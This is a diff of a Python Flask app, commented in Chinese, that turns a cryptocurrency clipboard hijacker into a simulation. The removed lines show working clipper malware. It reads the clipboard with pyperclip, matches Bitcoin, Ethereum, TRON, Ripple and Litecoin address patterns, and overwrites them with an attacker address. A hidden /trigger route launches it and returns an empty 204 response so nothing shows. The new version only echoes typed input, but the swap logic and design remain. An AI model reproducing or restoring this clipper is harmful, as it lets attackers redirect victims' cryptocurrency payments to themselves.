@@ -1,8 +1,6 @@
 from flask import Flask
-import pyperclip
 import re
 import threading
-import time  # 修复剪贴板监控的休眠错误
 
 # 替换的目标地址
 ATTACKER_ADDRESS = "panteklu"
@@ -14,35 +12,35 @@ def is_crypto_address(address):
     """
     patterns = {
         "Bitcoin (Legacy)": r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
+        "Bitcoin (SegWit)": r"^bc1[a-zA-HJ-NP-Z0-9]{6,87}$",
         "Ethereum": r"^0x[a-fA-F0-9]{40}$",
         "TRON": r"^T[a-zA-Z0-9]{33}$",
         "Ripple": r"^r[a-zA-Z0-9]{23,43}$",
         "Litecoin": r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,35}$",
     }
     for regex in patterns.values():
-        if re.fullmatch(regex, address):
+        if re.match(regex, address):
             return True
     return False
 
 
 def monitor_clipboard():
     """
-    监控剪贴板内容，并替换符合加密货币地址规则的内容。
+    模拟剪贴板监控内容，替换符合规则的加密货币地址。
     """
     previous_content = ""
+    print("模拟开始剪贴板替换...")
     while True:
         try:
-            clipboard_content = pyperclip.paste()  # 获取剪贴板内容
+            clipboard_content = input("模拟输入剪贴板内容（按 Enter 结束）：")  # 用户手动输入模拟替换的内容
             if clipboard_content != previous_content and is_crypto_address(clipboard_content):
-                pyperclip.copy(ATTACKER_ADDRESS)  # 替换剪贴板内容
                 previous_content = ATTACKER_ADDRESS
-                print(f"Replaced clipboard content: {clipboard_content} -> {ATTACKER_ADDRESS}")
+                print(f"替换结果: {clipboard_content} -> {ATTACKER_ADDRESS}")
             else:
                 previous_content = clipboard_content
-            time.sleep(0.5)  # 防止高频率运行
-        except Exception as e:
-            print(f"Error monitoring clipboard: {e}")
-            time.sleep(1)
+        except KeyboardInterrupt:
+            print("监控终止")
+            break
 
 
 app = Flask(__name__)
@@ -50,7 +48,7 @@ app = Flask(__name__)
 @app.route("/", methods=["GET"])
 def home():
     """
-    根路径响应，避免出现 404 错误。
+    根路径响应。
     """
     return "Welcome to the clipboard monitoring service!", 200
 
@@ -58,11 +56,11 @@ def home():
 @app.route("/trigger", methods=["GET"])
 def trigger():
     """
-    链接点击触发剪贴板监控逻辑。
+    触发监控内容。
     """
     threading.Thread(target=monitor_clipboard).start()
-    print("Trigger triggered! Clipboard monitoring started.")
-    return "", 204  # 返回 204 No Content，避免显示内容
+    print("Trigger triggered! 模拟剪贴板监控已经启动。")
+    return "", 204  # 返回 204 No Content
 
 
 if __name__ == "__main__":
